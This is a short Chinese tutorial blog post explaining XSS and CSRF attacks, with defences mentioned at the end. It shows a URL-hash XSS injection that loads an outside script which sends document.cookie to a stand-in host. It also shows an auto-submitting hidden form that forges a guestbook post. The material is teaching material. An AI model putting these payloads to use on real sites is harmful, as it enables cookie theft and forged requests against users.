title: web安全之攻击
date: 2016-08-02 17:09:15
tags:
- Web
- Security
---
> 以下知识主要来自`《深入浅出Node.js》`一书

### XSS攻击
+ 概念
  - 其全称是跨站脚本攻击（Cross Site Scripting）
  - 通常是由网站开发者决定哪些脚本可以执行在浏览器端，不过XSS攻击是利用了XSS漏洞，让别的脚本执行，它的主要形成原因多数是因为 用户的输入没有被转义，而被直接执行
<!-- more -->
+ 例子
  - 有个网站的前端脚本如下`$(#box).html(location.hash.replace('#', ''))`,它会将URL hash中的值设置到页面中，以实现某种逻辑；这里攻击者可以构造如下的URL`http://a.com/pathname#<script src="http://b.com/c.js"></script>`然后将这个网站发给某个已经登录了`http://a.com/pathname`的用户，此时会发生的情况是，a.com网站加载完成后，运行了`$(#box).html(location.hash.replace('#',''))`的逻辑，`<script src="http://b.com/c.js">`被解析，加载，运行；这里我们假设c.js这个文件的内容`location.href = "http://c.com/?" + document.cookie;`这样就会发生，用户的cookie被发送了`http://c.com`这个网站了,从而得到了用户cookie

### CSRF攻击
+ 概念
  - 其全称是跨站请求伪造(Cross-Site Request Forgery)
  - 服务端与客户端通过Cookie来标识和认证用户，通常而言，用户通过浏览器访问服务端的Session ID是无法被第三方知道的，但是CSRF的攻击者并不需要知道Session ID就能让用户中招
+ 例子
  - 某个网站有这样一个留言程序，提交留言的接口为`http://domain_a.com/guestbook`用户通过POST提交content字段就能成功留言，服务端会自动从Session数据中判断是谁提交的数据，补足username和updateAt两个字段后向数据库中定入数据，如下所示
  ```
  function (req, res) {
    var content = req.body.content || '';
    var username = req.session.username;
    var feedback = {
    username: username,
    content: content,
    updatedAt: Date.now()
    };
    db.save(feedback, function (err) {
    res.writeHead(200);
    res.end('Ok');
    });
  }
  ```
  - 正常情况下，谁提交的留言，就会在列表中显示谁的信息，如果某个攻击者发现了这里的接口存在CSRF漏洞，那么他就可以在另一个网站(http://domain_b.com/attack)上构造了一个表单提交，如下所示
  ```
 <form id="test" method="POST" action="http://domain_a.com/guestbook">
    <input type="hidden" name="content" value="vim是
上的编辑器" /> 
</form>
<script type="text/javascript">
  $(function () {
    $("#test").submit();
  });
</script>
  ```
  - 这种情况下，攻击者只要引诱某个**domain_a的登录用户**访问这个domain_b的网站，就会自己提交一个留言，由于在提交到domain_a的过程中（访问domain_a了，浏览器会自己携带上cookie的），浏览器会将domain_a的Cookie发送到服务器，尽管这个请求就是来自domain_b的，但是服务器并不知情，用户了不知情。
  - 关于csrf防御的可以参考 [链接](https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/),使用Referer,token,自定义http字段都是相关的解决方案